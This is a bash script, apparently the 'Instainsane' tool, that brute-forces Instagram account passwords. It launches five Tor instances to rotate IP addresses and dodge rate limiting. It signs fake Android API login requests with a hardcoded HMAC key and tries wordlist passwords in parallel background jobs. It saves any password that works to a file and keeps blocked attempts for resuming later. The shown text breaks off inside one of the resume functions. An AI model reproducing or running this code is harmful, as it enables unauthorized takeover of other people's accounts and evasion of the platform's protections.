#!/bin/bash
# Coded by: thelinuxchoice (Don't change, noob!)
# www.github.com/thelinuxchoice
# www.instagram.com/linux_choice

trap 'store; exit 1;' 2

counter=0
counter2=20
counter3=40
counter4=60
counter5=80
start=0
end=20
turn=$((start+end))
startline=1
endline=20
sumstart=0
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var0=$(curl --socks5 localhost:9050 -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var0 | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)


banner() {

printf "\e[1;95m  _              _            \e[0m\e[1;91m_____                                  \e[0m\n"
printf "\e[1;95m (_) _ __   ___ | |_   __ _   \e[0m\e[1;91m\_   \ _ __   ___   __ _  _ __    ___  \e[0m\n"
printf "\e[1;95m | || '_ \ / __|| __| / _\` |   \e[0m\e[1;91m/ /\/| '_ \ / __| / _\` || '_ \  / _ \ \e[0m\n"
printf "\e[1;95m | || | | |\__ \| |_ | (_| |\e[0m\e[1;91m/\/ /_  | | | |\__ \| (_| || | | ||  __/ \e[0m\n"
printf "\e[1;77m |_||_| |_||___/ \__| \__,_|\e[0m\e[1;77m\____/  |_| |_||___/ \__,_||_| |_| \___| \e[0m\n"
printf "\n"
printf "\e[1;77m\e[41m  Instagram Brute Forcer v1.0, Author: @thelinuxchoice (Github/IG)  \e[0m\n" #Don't change, noob
printf "\n"
}


function start() {
read -p $'\e[1;92mUsername account: \e[0m' user
checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mInvalid Username! Try again\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="100"
threads="${threads:-${default_threads}}"
fi
}


checkroot() {
#if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mWelcome!\n\e[0m"
#    exit 1
#fi
}


dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Run ./install.sh Aborting."; exit 1; }

command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi

}


multitor() {

if [[ ! -d multitor ]]; then
mkdir multitor;
printf "SOCKSPort 9050\nDataDirectory /var/lib/tor1" > multitor/multitor1
printf "SOCKSPort 9052\nDataDirectory /var/lib/tor2" > multitor/multitor2
printf "SOCKSPort 9053\nDataDirectory /var/lib/tor3" > multitor/multitor6
printf "SOCKSPort 9054\nDataDirectory /var/lib/tor4" > multitor/multitor4
printf "SOCKSPort 9055\nDataDirectory /var/lib/tor5" > multitor/multitor5
fi

printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9050\e[0m\n"
tor -f multitor/multitor1 > /dev/null &
tor1=$!
#printf "Process %s\n" $tor1
sleep 6
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9052\e[0m\n"
tor -f multitor/multitor2 > /dev/null & 
tor2=$!
sleep 6
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9053\e[0m\n"
tor -f multitor/multitor3 > /dev/null &
sleep 6
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9054\e[0m\n"
tor -f multitor/multitor4 > /dev/null &
sleep 6
printf "\e[1;92m[*] Starting Tor on port:\e[0m\e[1;77m 9055\e[0m\n"
tor -f multitor/multitor5 > /dev/null &
sleep 6
checkcount=0
printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9050\e[0m..."
check1=$(curl --socks5-hostname localhost:9050 -s https://www.google.com > /dev/null; echo $?)
if [[ "check1" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9052\e[0m..."
check2=$(curl --socks5-hostname localhost:9052 -s https://www.google.com > /dev/null; echo $?)
if [[ "check2" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi
 
printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9053\e[0m..."
check3=$(curl --socks5-hostname localhost:9053 -s http://www.google.com > /dev/null; echo $?)
if [[ "check3" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi


printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9054\e[0m..."
check4=$(curl --socks5-hostname localhost:9054 -s https://www.google.com > /dev/null; echo $?)
if [[ "check4" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9055\e[0m..."
check5=$(curl --socks5-hostname localhost:9055 -s https://www.google.com > /dev/null; echo $?)
if [[ "check5" -gt 0 ]]; then
printf "\e[1;91mFAIL!\e[0m\n"
else
printf "\e[1;92mOK!\e[0m\n"
let checkcount++
fi

if [[ $checkcount != 5 ]]; then
printf "\e[1;91mRequire all TOR connection running to continue. Exiting\e[0m\n"
exit 1
fi
printf "\n"
printf "\e[1;77m[*] Starting...\e[0m\n"
printf "\e[1;91m [*] Press Crtl + C to Stop/Save session\e[0m\n"
sleep 2
}

function store() {

if [[ -n "$threads" ]]; then
printf "\n"
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
wait $pid1 > /dev/null 2>&1 ; wait $pid2 > /dev/null 2>&1 ; wait $pid3 > /dev/null 2>&1 ; wait $pid4 > /dev/null 2>&1 ; wait $!;
sleep 6

if [[ -e nottested.lst ]]; then
not=$(wc -l nottested.lst | cut -d " " -f1)
printf "\e[1;92m [!] Passwords not tested due IP BLocking:\e[0m\e[1;77m %s\e[0m\n" $not
ssfile="nottested.$user.$RANDOM"
sfile=$(mv nottested.lst $ssfile | echo $ssfile) 
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m %s\n" $sfile
rm -rf nottested.lst
printf "\e[1;91m [!] Use this file as wordlist!\e[0m\n"
fi
default_session="Y"
printf "\n\e[1;77m [?] Save session for user\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $user $pass $wl_pass $countpass > sessions/store.session.$user.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instainsane.sh --resume\n"
else
exit 1
fi
else
exit 1
fi
}


bf1() {

while [ $counter -lt $turn ]; do

IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1  ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid1=$! ; #;wait $!;
 
let startline+=20
let endline+=20

done

}


bf2() {

while [ $counter2 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter2++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9052 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst ; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid2=$! ; # wait $!;

let startline+=20
let endline+=20

done

}


bf3() {

while [ $counter3 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter3++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]];  then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid3=$! ; # wait $!;

let startline+=20
let endline+=20

done
}


bf4() {

count_pass=$(wc -l $wl_pass | cut -d " " -f1)
while [ $counter4 -lt $turn ]; do

IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'


let counter4++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then  echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid4=$! ; # wait $!;

let startline+=20
let endline+=20

done
}

bf5() {

while [ $counter5 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter5++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m";  rm -rf nottested.lst;kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; wait $pid1 > /dev/null 2>&1; wait $pid2 > /dev/null 2>&1 ; wait $pid3 > /dev/null 2>&1 ; wait $pid4 > /dev/null 2>&1; wait $! > /dev/null 2>&1 ;

let startline+=20
let endline+=20

done
}


bf1resume() {

while [ $counter -lt $turn ]; do
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
startresume1=$((startresume+1))
IFS=$'\n'
for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do

count_pass=$(wc -l $wl_pass | cut -d " " -f1)
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'


let counter++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid1=$! ; #;wait $!;

let startline+=20
let endline+=20

done
}

bf2resume() {

while [ $counter2 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
startresume1=$((startresume+1))
IFS=$'\n'
for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter2++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9052 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid2=$! ; # wait $!;

let startline+=20
let endline+=20

done
}

bf3resume() {

while [ $counter3 -lt $turn ]; do
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
startresume1=$((startresume+1))
IFS=$'\n'
for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

let counter3++

printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass

{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  ; elif [[ $var == "Please wait" ]];  then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid3=$! ; # wait $!;

let startline+=20
let endline+=20

done
}


bf4resume() {

count_pass=$(wc -l $wl_pass | cut -d " " -f1)
while [ $counter4 -lt $turn ]; do

IFS=$'\n'
startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
startresume1=$((startresume+1))
IFS=$'\n'
for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
IFS=$'\n'
